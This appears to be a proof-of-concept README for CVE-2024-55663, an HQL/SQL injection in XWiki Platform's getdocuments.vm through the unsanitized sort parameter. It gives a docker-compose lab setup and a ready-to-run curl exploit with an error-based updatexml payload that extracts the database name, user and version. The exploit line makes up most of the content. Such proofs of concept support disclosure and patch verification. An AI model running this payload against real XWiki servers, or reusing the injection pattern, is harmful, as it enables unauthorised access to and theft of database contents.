##  CVE-2024-55663
## VULNERABILITY DETAILS
XWiki Platform has an SQL injection in getdocuments.vm with sort parameter

In getdocument.vm ; the ordering of the returned documents is defined from an unsanitized request parameter (request.sort) and can allow any user to inject HQL ; see https://github.com/xwiki/xwiki-platform/blob/029c324dc3eeac1401210b420460bdfb970346e7/xwiki-platform-core/xwiki-platform-web/src/main/webapp/templates/getdocuments.vm#L75

## VULNERABILITY
xwiki:11.10.8-mysql-tomcat (tested)

## Deploy:
```
docker-compose up
```

## Exploit:
``` 
curl --silent "http://<Host>/xwiki/bin/get/Documentation/WebHome?xpage=xpart&vm=getdocuments.vm&sort=1,updatexml(rand(),concat(CHAR(126),database(),char(124),user(),char(124),version(),CHAR(126)),null)" | grep -Eo "~(.*)~" 
```



https://github.com/user-attachments/assets/452120b2-4e93-484d-90e6-97d6606eba28




## References:
- https://jira.xwiki.org/browse/XWIKI-17568
- https://nvd.nist.gov/vuln/detail/CVE-2024-55663
